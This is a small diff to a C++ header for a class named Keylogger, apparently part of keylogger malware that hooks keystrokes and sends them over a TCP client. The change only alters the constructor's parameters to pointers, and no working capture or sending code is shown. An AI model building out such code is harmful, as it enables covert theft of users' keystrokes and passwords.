@@ -15,7 +15,7 @@ class Keylogger
 {
 public:
 	BOOLEAN SetHook();
-	Keylogger(TcpClient client, Filters filters);
+	Keylogger(TcpClient *client, Filters *filters);
 	~Keylogger();
 
 private:
